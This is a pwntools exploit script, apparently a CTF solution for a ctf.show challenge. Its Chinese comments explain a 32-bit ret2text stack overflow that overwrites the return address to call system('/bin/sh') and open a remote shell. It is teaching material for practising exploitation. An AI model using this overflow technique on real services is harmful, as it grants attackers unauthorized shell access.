from pwn import *

p = remote('pwn.challenge.ctf.show', 28105)

# sys_addr = 0x80483A0：system函数的地址
# 通过IDA分析程序找到的system函数地址
sys_addr = 0x80483A0

# bin_sh_addr = 0x8048750：/bin/sh字符串的地址
# 通过IDA搜索字符串找到的"/bin/sh"地址
bin_sh_addr = 0x8048750

# offset = 0x12 + 4：计算栈溢出的偏移量
# 0x12：缓冲区到saved ebp的距离
# 4：saved ebp的大小（32位程序）
# 总偏移量 = 0x12 + 4 = 0x16，定位到返回地址
offset = 0x12 + 4

# payload = b'a' * offset + p32(sys_addr) + p32(0) + p32(bin_sh_addr)：构造攻击载荷
# b'a' * offset：填充垃圾数据到返回地址位置
# p32(sys_addr)：覆盖返回地址为system函数地址
# p32(0)：system函数的返回地址（执行完system后跳转到0，这里可以填任意值）
# p32(bin_sh_addr)：system函数的参数，即"/bin/sh"字符串的地址
# 32位函数调用约定：参数通过栈传递，从右到左入栈
payload = b'a' * offset + p32(sys_addr) + p32(0) + p32(bin_sh_addr)

p.send(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - system函数调用
2. 核心概念：
   - 程序中同时存在 system 函数和 /bin/sh 字符串，但不在同一处
   - 需要自己构造调用链：system("/bin/sh")
3. 32位函数调用约定：
   - 参数通过栈传递
   - 调用函数时，参数从右到左入栈
   - 返回地址在参数之后
4. payload结构分析：
   b'a' * offset      - 填充到返回地址
   + p32(sys_addr)    - 返回地址指向system
   + p32(0)           - system的返回地址（执行完system后去哪，这里随意）
   + p32(bin_sh_addr) - system的参数（/bin/sh字符串地址）
5. 栈布局：
   [填充数据] [system地址] [返回地址] [/bin/sh地址]
                              ↑
                           调用system时esp指向这里
6. 关键点：理解32位函数调用时栈的结构
"""
